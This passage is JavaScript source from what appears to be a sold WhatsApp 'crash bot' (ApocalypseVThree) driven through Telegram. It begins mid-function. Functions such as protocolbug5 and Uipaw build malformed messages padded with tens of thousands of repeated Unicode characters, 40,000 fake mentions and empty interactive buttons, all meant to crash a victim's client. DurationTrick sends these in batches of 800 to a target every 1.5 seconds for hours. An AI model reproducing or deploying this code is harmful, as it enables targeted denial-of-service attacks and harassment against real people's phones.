                                        buttonParamsJson: venomModsData + "\u0000",
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: venomModsData + "𝗔𝗽𝗼𝗰𝗮𝗹𝘆𝗽𝘀𝗲",
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await paw.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

async function DurationTrick(paw, durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`⏹️ Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 800) {
        await protocolbug5(paw, target, false);
        console.log(chalk.red(`🔥 Sending Crash ${count}/800 ke ${target}`));
        count++;
      } else {
        console.log(chalk.green(`✅ Success Sending 800 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages..."));
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
    }

    await sleep(1500); // ⏱️ delay 1,5 detik antar pesan
    sendNext();
  };

  sendNext();
}


async function protocolbug5(paw, target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".AxpawXOne¡?" + "ោ៝".repeat(10000),
        title: "Apocalypse",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝐀͢𝐩𝐨͡𝐜𝐚ܢ𝐥𝐲𝐩͞𝐬𝐞⃟",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363334766163982@newsletter",
            serverMessageId: 1,
            newsletterName: "χඞ"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await paw.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await paw.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function Uipaw(paw, target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target
                        },
                    },
                    body: {
                        text: "𝐀͢𝐩𝐨͡𝐜𝐚ܢ𝐥𝐲𝐩͞𝐬𝐞⃟" + "ꦽ".repeat(45000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await paw.relayMessage(target, message, {
        participant: {
            jid: target
        },
    });
  console.log(chalk.red("BUGS SUCCES SENDED"));    
}

// --- Jalankan Bot ---
async function initializeBot() {
  await validateToken();

  console.log(chalk.bold.white(`\n
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂⢕
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
┏━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ApocalypseVThree
┣━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ Created By AxpawXOne¡?
┃ THANKS FOR BUYYING MY SCRIPT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`));

  console.log(chalk.yellow("Connecting to WhatsApp..."));
  await initializeWhatsAppConnections();

  console.log(chalk.green("WhatsApp connected successfully!"));

  await bot.launch();
  console.log(chalk.green("Telegram bot is running..."));
}

initializeBot().catch(err => {
  console.error("Error during bot initialization:", err);
});

// Handle shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));